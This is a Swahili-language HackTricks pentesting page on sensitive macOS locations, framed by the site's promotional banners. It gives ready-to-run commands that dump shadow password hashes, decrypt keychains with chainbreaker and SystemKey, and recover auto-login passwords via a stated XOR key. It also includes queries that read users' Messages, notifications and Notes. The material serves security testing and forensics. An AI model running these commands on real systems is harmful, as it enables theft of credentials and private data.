# Maeneo Muhimu ya macOS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Maneno ya Siri

### Maneno ya Siri ya Kivuli

Maneno ya siri ya kivuli huhifadhiwa pamoja na usanidi wa mtumiaji katika plists iliyoko kwenye **`/var/db/dslocal/nodes/Default/users/`**.\
Oneliner ifuatayo inaweza kutumika kudumpisha **habari zote kuhusu watumiaji** (ikiwa ni pamoja na habari za hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts kama hii**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**hii**](https://github.com/octomagon/davegrohl.git) inaweza kutumika kubadilisha hash kuwa **muundo wa hashcat**.

Laini mbadala ambayo itatoa siri za akaunti zote zisizo za huduma katika muundo wa hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Kupata Mwaga wa Keychain

Tambua kuwa unapotumia binary ya usalama kwa **kupata mwaga wa nywila zilizofichuliwa**, maombi kadhaa yatauliza mtumiaji kuruhusu operesheni hii.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) inaonekana kama zana hizi hazifanyi kazi tena katika Big Sur.
{% endhint %}

### Muhtasari wa Keychaindump

Zana inayoitwa **keychaindump** imeendelezwa ili kutoa nywila kutoka kwa keychains ya macOS, lakini inakabiliwa na vizuizi katika toleo jipya la macOS kama Big Sur, kama ilivyoelezwa katika [mjadala](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambuliaji kupata ufikiaji na kuongeza mamlaka hadi **root**. Zana hii inatumia udhaifu kwamba keychain inafunguliwa kiotomatiki baada ya mtumiaji kuingia kwa urahisi, kuruhusu programu kupata keychain bila kuhitaji nywila ya mtumiaji mara kwa mara. Walakini, ikiwa mtumiaji anachagua kufunga keychain yao baada ya kila matumizi, **keychaindump** inakuwa haifanyi kazi.

**Keychaindump** inafanya kazi kwa kulenga mchakato maalum unaoitwa **securityd**, ulioelezewa na Apple kama daemoni ya idhini na shughuli za kryptografia, muhimu kwa kupata keychain. Mchakato wa uchimbaji unahusisha kutambua **Master Key** inayotokana na nywila ya kuingia ya mtumiaji. Ufunguo huu ni muhimu kwa kusoma faili ya keychain. Ili kupata **Master Key**, **keychaindump** inachunguza kumbukumbu ya **securityd** kwa kutumia amri ya `vmmap`, ikisaka ufunguo unaowezekana ndani ya maeneo yaliyotambuliwa kama `MALLOC_TINY`. Amri ifuatayo hutumiwa kuangalia maeneo haya ya kumbukumbu:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Baada ya kutambua ufunguo wa msingi unaowezekana, **keychaindump** inatafuta kupitia rundo la data kwa mfano maalum (`0x0000000000000018`) ambao unaashiria mgombea wa ufunguo wa msingi. Hatua zaidi, ikiwa ni pamoja na kufuta uchafu, zinahitajika ili kutumia ufunguo huu, kama ilivyoelezwa katika msimbo wa chanzo wa **keychaindump**. Wachambuzi wanaojikita katika eneo hili wanapaswa kuzingatia kuwa data muhimu kwa kufuta ufunguo wa keychain imehifadhiwa ndani ya kumbukumbu ya mchakato wa **securityd**. Amri ya mfano ya kuendesha **keychaindump** ni:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kuondoa aina zifuatazo za habari kutoka kwenye keychain ya OSX kwa njia salama ya kiforensiki:

* Hashed Keychain password, inayofaa kwa kuvunja kwa kutumia [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
* Manenosiri ya Mtandao
* Manenosiri ya Kawaida
* Private Keys
* Public Keys
* Vyeti vya X509
* Noti Salama
* Manenosiri ya Appleshare

Kwa kutumia nenosiri la kufungua keychain, ufunguo mkuu uliopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa manenosiri ya maandishi wazi.

Bila moja ya njia hizi za kufungua Keychain, Chainbreaker itaonyesha habari zote zilizopo.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with SystemKey**

#### **Dumpisha funguo za keychain (pamoja na nywila) kwa kutumia SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**

#### **Dumpisha funguo za keychain (pamoja na nywila) kwa kuvunja hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with memory dump**

[Fuata hatua hizi](..#dumping-memory-with-osxpmem) kutekeleza **dump ya kumbukumbu**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Ikiwa unajua nenosiri la mtumiaji, unaweza kulitumia kudondosha na kufichua keychains ambazo ni za mtumiaji.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Faili la **kcpassword** ni faili ambalo linashikilia **nywila ya kuingia ya mtumiaji**, lakini tu ikiwa mmiliki wa mfumo amewezesha kuingia moja kwa moja. Kwa hivyo, mtumiaji ataingia moja kwa moja bila kuombwa nywila (ambayo sio salama sana).

Nywila imehifadhiwa katika faili **`/etc/kcpassword`** iliyofanyiwa operesheni ya XOR na ufunguo **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa nywila ya mtumiaji ni ndefu kuliko ufunguo, ufunguo utatumika tena.\
Hii inafanya nywila kuwa rahisi kupata, kwa mfano kwa kutumia hati kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Taarifa ya Kuvutia katika Databases

### Ujumbe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Taarifa za Arifa

Unaweza kupata data za Arifa katika `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Maelezo mengi ya kuvutia yatakuwa katika **blob**. Hivyo utahitaji **kuchimbua** yaliyomo hayo na **kubadilisha** kuwa **soma kwa binadamu** au tumia **`strings`**. Ili kufikia hilo unaweza kufanya:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Maelezo

Maelezo ya watumiaji yanaweza kupatikana katika `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
